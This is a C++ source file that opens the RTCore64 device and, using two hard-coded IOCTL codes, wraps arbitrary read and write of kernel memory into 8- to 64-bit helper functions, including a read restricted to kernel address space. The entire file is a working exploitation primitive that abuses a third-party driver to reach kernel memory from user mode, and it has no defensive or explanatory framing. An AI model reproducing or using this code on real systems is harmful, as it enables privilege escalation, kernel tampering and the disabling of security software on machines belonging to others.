#include "rtcore.h"

namespace RTCore {

HANDLE hDev = INVALID_HANDLE_VALUE;

static const DWORD IOCTL_READ  = 0x80002048;
static const DWORD IOCTL_WRITE = 0x8000204c;

bool Open() {
    hDev = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE,
        0, nullptr, OPEN_EXISTING, 0, nullptr);
    return hDev != INVALID_HANDLE_VALUE;
}

void Close() {
    if (hDev != INVALID_HANDLE_VALUE) { CloseHandle(hDev); hDev = INVALID_HANDLE_VALUE; }
}

static DWORD RawRead(DWORD64 addr, DWORD size) {
    RTCORE64_MEMORY_OP op{};
    op.Address = addr;
    op.Size    = size;
    DWORD n;
    DeviceIoControl(hDev, IOCTL_READ, &op, sizeof(op), &op, sizeof(op), &n, nullptr);
    return op.Value;
}

static void RawWrite(DWORD64 addr, DWORD size, DWORD val) {
    RTCORE64_MEMORY_OP op{};
    op.Address = addr;
    op.Size    = size;
    op.Value   = val;
    DWORD n;
    DeviceIoControl(hDev, IOCTL_WRITE, &op, sizeof(op), &op, sizeof(op), &n, nullptr);
}

BYTE    Rd8 (DWORD64 a) { return (BYTE)(RawRead(a, 1) & 0xFF); }
WORD    Rd16(DWORD64 a) { return (WORD)(RawRead(a, 2) & 0xFFFF); }
DWORD   Rd32(DWORD64 a) { return RawRead(a, 4); }
DWORD64 Rd64(DWORD64 a) { return ((DWORD64)Rd32(a+4) << 32) | Rd32(a); }

void    Wr8 (DWORD64 a, BYTE    v) { RawWrite(a, 1, v); }
void    Wr32(DWORD64 a, DWORD   v) { RawWrite(a, 4, v); }
void    Wr64(DWORD64 a, DWORD64 v) { Wr32(a, (DWORD)(v & 0xFFFFFFFF)); Wr32(a+4, (DWORD)(v >> 32)); }

// Canonical kernel VA: 0xFFFF800000000000 – 0xFFFFFFFFFFFFFFFF
bool SafeRd64(DWORD64 addr, DWORD64& out) {
    if ((addr >> 48) != 0xFFFF && (addr >> 48) != 0x0000) return false;
    if (addr < 0xFFFF800000000000ULL) return false;
    out = Rd64(addr);
    return true;
}

} // namespace RTCore
